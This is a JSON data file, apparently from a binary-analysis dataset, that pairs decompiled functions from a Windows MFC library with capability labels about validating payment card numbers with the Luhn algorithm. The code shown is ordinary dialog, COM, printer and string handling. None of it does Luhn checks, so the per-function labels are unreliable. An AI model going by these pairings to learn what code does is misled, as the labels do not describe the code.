{
    "18000bfd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000bfd8(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t *piVar4;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar5;\n    \n    *arg1 = vtable.CDHtmlDialog.1.0;\n    arg1[0x1d] = vtable.CDHtmlDialog.0;\n    if (arg1[0x41] != NULL) {\n        (**(*arg1[0x41] + 0x10))();\n    }\n    if (arg1[0x3e] != NULL) {\n        fcn.18003342c(arg1[0x3e]);\n        arg1[0x3e] = NULL;\n    }\n    *(arg1 + 0x3f) = 0;\n    *(arg1 + 0x1fc) = 0;\n    if (arg1[0x3c] != NULL) {\n        fcn.18003342c(arg1[0x3c]);\n        arg1[0x3c] = NULL;\n    }\n    *(arg1 + 0x3d) = 0;\n    *(arg1 + 0x1ec) = 0;\n    fcn.1800187d8(arg1 + 0x26);\n    pcVar3 = arg1[0x25];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    if (arg1[0x23] != NULL) {\n        (**(*arg1[0x23] + 0x10))();\n    }\n    if (arg1[0x22] != NULL) {\n        (**(*arg1[0x22] + 0x10))();\n    }\n    pcVar3 = arg1[0x1f];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.180017f78(arg1);\n    }\n    uVar5 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x18006cc70)) && (arg1 != 0x18006cd20)) &&\n       ((arg1 != 0x18006cdd0 && (arg1 != 0x18006ce80)))) {\n        fcn.180017f78(arg1);\n    }\n    piVar4 = arg1[0x13];\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4, 1, in_R8, in_R9, uVar5);\n    }\n    pcVar3 = arg1[0x14];\n    if ((pcVar3 != NULL) && (*(pcVar3 + 0x50) == arg1)) {\n        *(pcVar3 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 821
    },
    "18001143": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001143c(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.180017f78(arg1);\n    }\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x18006cc70)) && (arg1 != 0x18006cd20)) &&\n       ((arg1 != 0x18006cdd0 && (arg1 != 0x18006ce80)))) {\n        fcn.180017f78(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 337
    },
    "1800187d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800187d8(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x18006cc70)) && (arg1 != 0x18006cd20)) &&\n       ((arg1 != 0x18006cdd0 && (arg1 != 0x18006ce80)))) {\n        fcn.180017f78(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 301
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "1800087c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.1800087c4(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    \n    piVar3 = fcn.180012330();\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    iVar4 = (**(*piVar3 + 0x18))(piVar3);\n    *arg1 = iVar4 + 0x18;\n    if (arg2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if ((arg2 & 0xffffffffffff0000) == 0) {\n            iVar4 = fcn.18001231c(arg2 & 0xffff);\n            if (iVar4 == 0) {\n                return arg1;\n            }\n            fcn.180008b80(arg1, iVar4, arg2 & 0xffff);\n            return arg1;\n        }\n        uVar2 = fcn.180033b84(arg2);\n    }\n    fcn.180008dfc(arg1, arg2, uVar2);\n    return arg1;\n}\n",
        "token_count": 300
    },
    "18000a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.18000a34c(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uchar *puVar2;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_bp_20h;\n    uchar auStack56 [32];\n    uchar auStack24 [8];\n    uint64_t uStack16;\n    \n    puVar2 = &stack0xffffffffffffffc8;\n    uStack16 = *0x180067ce0 ^ &stack0xffffffffffffffe8;\n    if (-arg1 - 1U < 0x4000) {\n        auStack24[0] = 0;\n    }\n    else {\n        uVar1 = arg1 + 0x400f;\n        if (uVar1 <= arg1 + 0x4000U) {\n            uVar1 = 0xffffffffffffff0;\n        }\n        uVar1 = uVar1 & 0xfffffffffffffff0;\n        fcn.180047db0();\n        puVar2 = &stack0xffffffffffffffc8 + -uVar1;\n    }\n    uVar1 = uStack16 ^ &stack0xffffffffffffffe8;\n    *(puVar2 + -8) = 0x18000a3c5;\n    fcn.180032ea0(uVar1);\n    return;\n}\n",
        "token_count": 304
    },
    "18000aba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18000aba0(code **arg1, code *arg2, ulong *arg3)\n\n{\n    *arg1 = vtable.CDHtmlElementEventSink.0;\n    arg1[2] = NULL;\n    arg1[1] = arg2;\n    (***arg3)(arg3, 0x180056148, arg1 + 2, arg3, 0xfffffffffffffffe);\n    *(arg1 + 3) = 0;\n    return arg1;\n}\n",
        "token_count": 110
    },
    "18000b2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018000b33b)\n// WARNING: Removing unreachable block (ram,0x00018000b349)\n// WARNING: Removing unreachable block (ram,0x00018000b34c)\n// WARNING: Removing unreachable block (ram,0x00018000b351)\n// WARNING: Removing unreachable block (ram,0x00018000b381)\n// WARNING: Removing unreachable block (ram,0x00018000b356)\n// WARNING: Removing unreachable block (ram,0x00018000b374)\n// WARNING: Removing unreachable block (ram,0x00018000b367)\n// WARNING: Removing unreachable block (ram,0x00018000b372)\n// WARNING: Removing unreachable block (ram,0x00018000b397)\n\nulong fcn.18000b2ec(ulong arg1, ulong *arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if (arg2 != NULL) {\n        (***arg2)(arg2);\n        return 0;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 267
    },
    "18000b44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.18000b44c(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t *piStackX8;\n    int64_t *apiStack24 [2];\n    \n    if (arg1 == NULL) {\n        iVar1 = -0x7ff8ffa9;\n    }\n    else {\n        apiStack24[0] = NULL;\n        piStackX8 = NULL;\n        iVar1 = (***arg1)(arg1, 0x18004d3f8, apiStack24);\n        if ((-1 < iVar1) && (iVar1 = (**(*apiStack24[0] + 0x20))(apiStack24[0], arg3, &piStackX8),  -1 < iVar1)) {\n            iVar1 = (**(*piStackX8 + 0x28))(piStackX8, arg2, arg4);\n        }\n        if (piStackX8 != NULL) {\n            (**(*piStackX8 + 0x10))();\n        }\n        if (apiStack24[0] != NULL) {\n            (**(*apiStack24[0] + 0x10))();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 277
    },
    "18000b59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18000b59c(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    uint64_t uVar4;\n    ulong in_RDX;\n    uint16_t uVar5;\n    ulong in_R9;\n    int64_t *apiStackX8 [2];\n    int64_t aiStackX24 [2];\n    \n    if (arg1 == NULL) {\n        fcn.180001214(0x80070057);\n        pcVar2 = swi(3);\n        uVar4 = (*pcVar2)();\n        return uVar4;\n    }\n    apiStackX8[0] = NULL;\n    uVar4 = (**(*arg1 + 0x70))(arg1, in_RDX, apiStackX8, in_R9, 0xfffffffffffffffe);\n    uVar5 = 0x1d;\n    if (uVar4 < 0) {\n        if (apiStackX8[0] != NULL) {\n            uVar4 = (**(*apiStackX8[0] + 0x10))();\n        }\n        return uVar4 & 0xffffffffffff0000 | 0x1d;\n    }\n    aiStackX24[0] = 0;\n    uVar4 = (**(*apiStackX8[0] + 0x18))(apiStackX8[0], aiStackX24);\n    uVar3 = 0x1d;\n    if (-1 < uVar4) {\n        if (aiStackX24[0] == 0) goto code_r0x00018000b687;\n        iVar1 = *(aiStackX24[0] + 0x2c);\n        if ((iVar1 == 6) || (iVar1 == 0)) {\n            if (*(aiStackX24[0] + 0x48) == 0x1d) {\n                uVar4 = fcn.18000b59c(apiStackX8[0]);\n                uVar3 = uVar4;\n            }\n            else if (iVar1 == 0) {\n                uVar3 = 3;\n            }\n            else if (iVar1 == 3) {\n                uVar3 = 0xd;\n            }\n            else if (iVar1 == 4) {\n                uVar3 = 9;\n            }\n            else {\n                uVar3 = *(aiStackX24[0] + 0x48);\n            }\n        }\n    }\n    uVar5 = uVar3;\n    if (aiStackX24[0] != 0) {\n        uVar4 = (**(*apiStackX8[0] + 0x98))();\n    }\ncode_r0x00018000b687:\n    if (apiStackX8[0] != NULL) {\n        uVar4 = (**(*apiStackX8[0] + 0x10))();\n    }\n    return uVar4 & 0xffffffffffff0000 | uVar5;\n}\n",
        "token_count": 659
    },
    "18000b6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18000b6a0(int64_t *arg1, ulong noname_1, ulong arg3)\n\n{\n    int16_t iVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    ulong var_8h;\n    int32_t *piStackX8;\n    int32_t *in_stack_00000028;\n    int64_t aiStack40 [2];\n    uint64_t uVar5;\n    \n    uVar3 = 0;\n    if (arg1 == NULL) {\n        uVar2 = 0x80070057;\n    }\n    else {\n        piStackX8 = NULL;\n        uVar2 = (**(*arg1 + 0x18))(arg1, aiStack40);\n        if (-1 < uVar2) {\n            uVar5 = uVar3;\n            if (*(aiStack40[0] + 0x30) != 0) {\n                do {\n                    uVar2 = (**(*arg1 + 0x28))(arg1, uVar5, &piStackX8);\n                    if (uVar2 < 0) {\n                        return uVar2;\n                    }\n                    if (*piStackX8 == arg3) break;\n                    (**(*arg1 + 0xa0))(arg1);\n                    piStackX8 = NULL;\n                    uVar4 = uVar5 + 1;\n                    uVar5 = uVar4;\n                } while (uVar4 < *(aiStack40[0] + 0x30));\n            }\n            (**(*arg1 + 0x98))();\n            if ((piStackX8 == NULL) || (8 < *(piStackX8 + 9))) {\n                uVar2 = 0x80004005;\n            }\n            else {\n                piVar7 = piStackX8;\n                if (0 < *(piStackX8 + 9)) {\n                    piVar6 = in_stack_00000028 + 2;\n                    uVar5 = uVar3;\n                    do {\n                        iVar1 = *(uVar3 + 8 + *(piVar7 + 4));\n                        *piVar6 = iVar1;\n                        if (iVar1 == 0x1a) {\n                            *piVar6 = *(*(uVar3 + *(piVar7 + 4)) + 8) | 0x4000;\n                        }\n                        if (*piVar6 == 0x1d) {\n                            iVar1 = fcn.18000b59c(arg1);\n                            *piVar6 = iVar1;\n                            piVar7 = piStackX8;\n                        }\n                        uVar4 = uVar5 + 1;\n                        uVar5 = uVar4;\n                        piVar6 = piVar6 + 2;\n                        uVar3 = uVar3 + 0x20;\n                    } while (uVar4 < *(piVar7 + 9));\n                }\n                iVar1 = *(piVar7 + 0xe);\n                if (iVar1 == 0x16) {\n                    iVar1 = 3;\n                }\n                else if (iVar1 == 0x17) {\n                    iVar1 = 0x13;\n                }\n                else if (iVar1 == 0x18) {\n                    iVar1 = 0;\n                }\n                else if (iVar1 == 0x19) {\n                    iVar1 = 10;\n                }\n                *(in_stack_00000028 + 1) = iVar1;\n                *in_stack_00000028 = piVar7[8];\n                *(in_stack_00000028 + 6) = *(piVar7 + 9);\n                (**(*arg1 + 0xa0))(arg1, piVar7);\n                uVar2 = 0;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 844
    },
    "18000bec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18000bec4(code **arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    code **ppcVar3;\n    int64_t iVar4;\n    \n    fcn.180011510(arg1, noname_1, arg4);\n    *arg1 = vtable.CDHtmlDialog.1.0;\n    arg1[0x1d] = vtable.CDHtmlDialog.0;\n    piVar2 = fcn.180012330();\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar3 = (*pcVar1)();\n        return ppcVar3;\n    }\n    iVar4 = (**(*piVar2 + 0x18))();\n    arg1[0x1f] = iVar4 + 0x18;\n    arg1[0x22] = NULL;\n    arg1[0x23] = NULL;\n    piVar2 = fcn.180012330();\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar3 = (*pcVar1)();\n        return ppcVar3;\n    }\n    iVar4 = (**(*piVar2 + 0x18))(piVar2);\n    arg1[0x25] = iVar4 + 0x18;\n    fcn.180015f5c(arg1 + 0x26);\n    arg1[0x3c] = NULL;\n    *(arg1 + 0x3d) = 0;\n    *(arg1 + 0x1ec) = 0;\n    arg1[0x3e] = NULL;\n    *(arg1 + 0x3f) = 0;\n    *(arg1 + 0x1fc) = 0;\n    arg1[0x41] = NULL;\n    fcn.18000b294(arg1);\n    *(arg1 + 0x21) = arg3;\n    return arg1;\n}\n",
        "token_count": 482
    },
    "18000c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18000c2cc(code **arg1, ulong arg2, code *arg3, code *arg4)\n\n{\n    code *in_stack_00000028;\n    \n    *arg1 = vtable.CDHtmlControlSink.0;\n    arg1[3] = NULL;\n    arg1[9] = NULL;\n    *(arg1 + 2) = 0;\n    arg1[10] = arg3;\n    arg1[1] = arg4;\n    arg1[0xb] = in_stack_00000028;\n    fcn.18000bda0(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 143
    },
    "18000c47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000c474(int64_t arg1)\n\n{\n    ulong in_R8;\n    ulong in_R9;\n    int64_t *apiStackX8 [4];\n    \n    apiStackX8[0] = NULL;\n    (**(*(arg1 + 0xe8) + 0x48))(arg1 + 0xe8, apiStackX8, in_R8, in_R9, 0xfffffffffffffffe);\n    if (apiStackX8[0] != NULL) {\n        fcn.18000b4fc(apiStackX8[0], 0x18004d890, *(arg1 + 0x1d8));\n        fcn.18000c0ec(arg1);\n        if (apiStackX8[0] != NULL) {\n            (**(*apiStackX8[0] + 0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "18000cf2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18000cf28(ulong noname_0, ulong noname_1, ulong arg3, ulong *arg4)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t *piStackX32;\n    \n    if (arg4 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    *arg4 = 0;\n    piStackX32 = NULL;\n    uVar3 = fcn.18000cc2c(noname_0, noname_1, &piStackX32, 0);\n    piVar2 = piStackX32;\n    if (piStackX32 != NULL) {\n        uVar3 = (***piStackX32)(piStackX32, arg3, arg4);\n    }\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 0x10))(piVar2);\n    }\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "18000dc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000dc7c(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong uStackX8;\n    \n    if (*(arg1 + 0xe8) != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(iVar2 + *(iVar2 + 2) * 2, arg2);\n        if (iVar1 == 0) {\n            iVar1 = sub.WINSPOOL.DRV_OpenPrinterW(arg2, &uStackX8, 0);\n            if (iVar1 != 0) {\n                if (*(arg1 + 0xe0) != 0) {\n                    fcn.18001cc28(*(arg1 + 0xe0));\n                }\n                iVar1 = sub.WINSPOOL.DRV_DocumentPropertiesW(0, uStackX8, arg2, 0, 0, 0);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, iVar1);\n                *(arg1 + 0xe0) = uVar3;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(uVar3);\n                iVar1 = sub.WINSPOOL.DRV_DocumentPropertiesW(0, uStackX8, arg2, uVar3, 0, 2);\n                if (iVar1 != 1) {\n                    fcn.18001cc28(*(arg1 + 0xe0));\n                    *(arg1 + 0xe0) = 0;\n                }\n                sub.WINSPOOL.DRV_ClosePrinter(uStackX8);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "18000e56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18000e568(code **arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    \n    fcn.180010fa8(arg1);\n    *arg1 = vtable.CWinApp.0;\n    if (arg2 == 0) {\n        arg1[0x14] = NULL;\n    }\n    else {\n        pcVar2 = fcn.180035bb0(arg2);\n        arg1[0x14] = pcVar2;\n    }\n    iVar3 = fcn.180014058();\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    iVar5 = fcn.180028cec(iVar3 + 0xc0, 0x18000dd78);\n    if (iVar5 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    if (iVar5 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        ppcVar4 = (*pcVar2)();\n        return ppcVar4;\n    }\n    *(iVar5 + 8) = arg1;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    arg1[0xb] = pcVar2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(arg1 + 0xc) = uVar1;\n    *(iVar3 + 8) = arg1;\n    arg1[0x11] = NULL;\n    arg1[0x1f] = NULL;\n    arg1[0x19] = NULL;\n    arg1[0x1a] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x18] = NULL;\n    arg1[0x22] = NULL;\n    arg1[0x16] = NULL;\n    *(arg1 + 0x122) = 0;\n    *(arg1 + 0x24) = 0;\n    arg1[0x12] = NULL;\n    arg1[0x23] = NULL;\n    *(arg1 + 0x20) = 0;\n    arg1[0x21] = NULL;\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = NULL;\n    *(arg1 + 0x124) = 0;\n    arg1[0x26] = NULL;\n    *(arg1 + 0x17) = 0;\n    *(arg1 + 0x1b) = 0;\n    arg1[0x25] = 0x200;\n    return arg1;\n}\n",
        "token_count": 667
    },
    "18000e6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.18000e6c4(int64_t *arg1, int64_t lpMultiByteStr, int64_t noname_2, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int64_t noname_1;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    noname_1 = lpMultiByteStr;\n    if (lpMultiByteStr != 0) {\n        noname_1 = 0;\n        noname_2 = lpMultiByteStr;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(3, 0, lpMultiByteStr, 0xffffffff, 0, 0);\n        uVar4 = iVar2 - 1;\n    }\n    if (uVar4 < 1) {\n        fcn.1800089e0(arg1, noname_1, noname_2);\n    }\n    else {\n        if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar4) < 0) {\n            fcn.180008ed0(arg1, uVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(3, 0, lpMultiByteStr, 0xffffffff, *arg1, uVar4);\n        if (*(*arg1 + -0xc) < uVar4) {\n            fcn.180001214(0x80070057);\n            pcVar1 = swi(3);\n            piVar3 = (*pcVar1)();\n            return piVar3;\n        }\n        *(*arg1 + -0x10) = uVar4;\n        *(*arg1 + uVar4 * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 409
    },
    "18000ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
